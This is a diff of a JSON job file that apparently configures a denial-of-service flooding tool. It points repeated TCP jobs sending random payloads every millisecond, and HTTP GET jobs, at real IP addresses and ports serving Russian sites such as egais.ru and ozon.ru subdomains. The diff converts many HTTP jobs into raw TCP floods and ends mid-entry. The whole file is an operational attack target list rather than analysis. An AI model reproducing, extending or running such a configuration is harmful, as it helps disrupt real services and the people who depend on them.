@@ -1,7 +1,39 @@
 {
   "jobs": [{
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "212.164.137.246:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "212.164.137.246:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "212.164.137.246:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "212.164.137.246:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -16,7 +48,7 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -31,7 +63,7 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -46,7 +78,7 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -61,82 +93,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://egais.ru"
+          "path": "http://check.egais.ru"
         },
         "client": {
           "static_host": {
             "addr": "212.164.137.246:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.164.137.246:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.164.137.246:80",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.164.137.246:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://check.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.164.137.246:80",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -151,7 +123,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://documents-utm.egais.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "212.164.137.246:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -159,21 +146,6 @@
         },
         "client": {
           "static_host": {
-            "addr": "212.164.137.246:80",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://documents-utm.egais.ru"
-        },
-        "client": {
-          "static_host": {
             "addr": "212.164.137.246:443",
             "is_tls": "true"
           }
@@ -181,22 +153,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://cheques-utm.egais.ru"
+          "path": "http://cheques-utm.egais.ru"
         },
         "client": {
           "static_host": {
             "addr": "212.164.137.246:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -211,22 +183,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://queries-utm.egais.ru"
+          "path": "http://queries-utm.egais.ru"
         },
         "client": {
           "static_host": {
             "addr": "212.164.137.246:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -235,533 +207,317 @@
         "client": {
           "static_host": {
             "addr": "212.164.137.246:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.19:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.19:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.28:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.29:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.30:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.34:8443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.38:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.38:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.41:8080",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.41:8443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.42:8080",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.42:8443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "address": "146.120.90.19:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.19:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.28:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.29:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.30:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.34:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.38:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.38:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.41:8080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.41:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.42:8080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.42:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
       "args": {
         "address": "146.120.90.52:4443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.52:8080",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.52:8443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.62:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.72:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.73:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.74:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.169:8443",
-            "is_tls": "true"
-          }
-        }
+        "address": "146.120.90.52:8080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "address": "146.120.90.52:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.62:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.72:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.73:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.74:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.169:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
       "args": {
         "address": "146.120.90.197:6443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.245:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.246:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.247:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "146.120.90.245:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "address": "146.120.90.246:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.247:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
       "args": {
         "address": "146.120.90.14:6443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.14:9443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.27:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "146.120.90.27:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "146.120.90.14:9443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "address": "146.120.90.27:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "146.120.90.27:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
       "args": {
         "address": "46.28.88.44:21",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.28.88.44:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "46.28.88.44:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "46.28.88.44:222",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "46.28.88.44:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "46.28.88.44:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "85.143.219.96:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "85.143.219.96:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.248.238.156:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.248.238.156:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.248.238.157:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.248.238.157:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "85.143.219.96:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://service.egais.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "85.143.219.96:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.ozon.ru/category/elektronika-15500/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.156:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.ozon.ru/category/elektronika-15500/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.156:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://seller.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.157:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -776,22 +532,7 @@
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://seller.ozon.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.238.157:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -805,38 +546,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://docs.ozon.ru/common/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.181.181.253:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "95.181.181.253:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "95.181.181.253:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://docs.ozon.ru/common/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.181.181.253:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -851,7 +578,7 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -865,38 +592,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://brandlab.ozon.ru/pick_up#order_packages"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.223.93.3:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "91.223.93.3:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "91.223.93.3:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://brandlab.ozon.ru/pick_up#order_packages"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.223.93.3:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -911,30 +624,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "91.223.93.3:3333",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://brandlab.ozon.ru/pick_up#order_packages"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.223.93.3:8443",
-            "is_tls": "true"
-          }
-        }
+        "address": "91.223.93.3:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -949,110 +655,181 @@
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "91.223.93.3:13000",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "91.223.93.3:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://job.ozon.ru/it/"
+          "path": "https://global.ozon.com/"
         },
         "client": {
           "static_host": {
-            "addr": "195.34.20.248:80",
-            "is_tls": "false"
+            "addr": "91.223.93.3:443",
+            "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://global.ozon.com/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://ir.ozon.com/sustainability/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://ir.ozon.com/sustainability/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://seller.learning.ozon.ru/0/login"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://seller.learning.ozon.ru/0/login"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://gosuslugi.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://gosuslugi.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://performance.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://performance.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.223.93.3:8443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "195.34.20.248:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "195.34.20.248:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1066,38 +843,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
+      "type": "tcp",
+      "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://job.ozon.ru/it/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "195.34.20.248:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "195.34.20.248:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://job.ozon.ru/it/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "195.34.20.248:8443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -1112,62 +867,91 @@
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
         "address": "195.34.20.248:13000",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "195.34.20.248:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "195.34.20.248:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "195.34.20.248:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "195.34.20.248:8443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://job.ozon.ru/it/"
+          "path": "https://xapi.ozon.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.223.93.15:80",
-            "is_tls": "false"
+            "addr": "195.34.20.248:443",
+            "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://xapi.ozon.ru/"
+        },
+        "client": {
+          "static_host": {
